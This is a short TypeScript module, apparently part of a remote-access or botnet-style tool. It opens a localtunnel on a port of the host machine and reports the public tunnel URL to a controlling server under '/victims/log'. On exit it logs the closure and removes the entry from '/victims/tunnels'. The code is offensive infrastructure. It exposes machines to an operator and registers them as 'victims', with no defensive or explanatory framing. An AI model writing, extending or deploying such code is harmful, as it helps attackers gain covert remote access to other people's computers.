import exitHook from 'async-exit-hook';
import localtunnel from 'localtunnel';
import HttpUtils from './http';

namespace TunnelUtils {
  export const init = async (port: number) => {
    // Init localtunnel instance
    const tunnel = await localtunnel({ port });
    HttpUtils.postJSON('/victims/log', {
      log: `Opens port ${port} for localtunnel at URL: ${tunnel.url}`,
    });
    // Clean-up tunnel upon close
    exitHook(() => {
      HttpUtils.postShellJSON('/victims/log', {
        log: `Closes port ${port} for localtunnel at URL: ${tunnel.url}`,
      });
      HttpUtils.deleteShellJSON('/victims/tunnels', {
        tunnelURL: tunnel.url,
      });
      tunnel.close();
    });
    return tunnel;
    // Close hook
    // tunnel.on('close', () => {});
  };
}

export default TunnelUtils;
